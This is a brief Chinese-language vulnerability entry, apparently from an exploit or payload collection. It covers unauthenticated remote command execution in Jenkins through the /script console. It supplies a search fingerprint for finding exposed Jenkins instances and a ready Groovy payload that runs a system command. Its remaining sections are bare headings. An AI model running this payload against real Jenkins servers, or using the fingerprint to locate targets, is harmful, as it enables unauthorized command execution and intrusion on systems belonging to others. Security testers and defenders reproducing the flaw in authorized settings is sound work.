# Jenkins未授权远程命令执行漏洞

- **系统**：Jenkins　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Jenkins Dashboard"`

**请求体 / payload**
```
/script
println "whoami".execute().text
```

**其他**
- Jenkins 未授权远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Jenkins